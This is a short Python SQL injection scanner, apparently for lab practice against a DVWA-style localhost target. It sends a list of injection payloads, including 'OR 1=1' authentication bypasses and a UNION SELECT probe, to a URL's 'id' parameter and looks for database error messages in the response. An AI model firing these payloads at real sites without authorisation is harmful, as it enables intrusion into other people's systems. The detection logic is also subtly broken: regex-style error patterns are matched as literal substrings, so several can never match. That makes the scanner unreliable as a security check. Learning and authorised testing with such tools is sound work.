#!/usr/bin/env python3
"""
Basic SQL Injection Scanner
Author: Raiza Rosas
Date: 2025
Purpose: Automated detection of SQL injection vulnerabilities in web forms
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys
from colorama import Fore, Style, init

init(autoreset=True)

class SQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        # SQL error patterns de diferentes bases de datos
        self.sql_errors = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Microsoft SQL Native Client error",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "SQLite/JDBCDriver",
            "SQLite.Exception"
        ]
        
        # Payloads básicos para detección
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1"
        ]
    
    def scan(self):
        print(f"{Fore.CYAN}[*] Iniciando escaneo de: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total de payloads a probar: {len(self.payloads)}{Style.RESET_ALL}\n")
        
        vulnerabilities_found = 0
        
        for payload in self.payloads:
            if self.test_payload(payload):
                vulnerabilities_found += 1
        
        print(f"\n{Fore.GREEN}[✓] Escaneo completado{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Vulnerabilidades encontradas: {vulnerabilities_found}{Style.RESET_ALL}")
        
        return vulnerabilities_found
    
    def test_payload(self, payload):
        """Prueba un payload específico contra el objetivo"""
        try:
            # Construcción de parámetros con payload
            params = {'id': payload, 'Submit': 'Submit'}
            
            response = self.session.get(self.target_url, params=params, timeout=5)
            
            # Análisis de respuesta
            for error_pattern in self.sql_errors:
                if error_pattern.lower() in response.text.lower():
                    print(f"{Fore.RED}[!] VULNERABLE - Payload: {payload}{Style.RESET_ALL}")
                    print(f"    Error detectado: {error_pattern}")
                    return True
            
            return False
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[!] Error de conexión: {e}{Style.RESET_ALL}")
            return False

def main():
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <URL_OBJETIVO>")
        print(f"Ejemplo: {sys.argv[0]} http://localhost/vulnerabilities/sqli/")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = SQLiScanner(target)
    scanner.scan()

if __name__ == "__main__":
    main()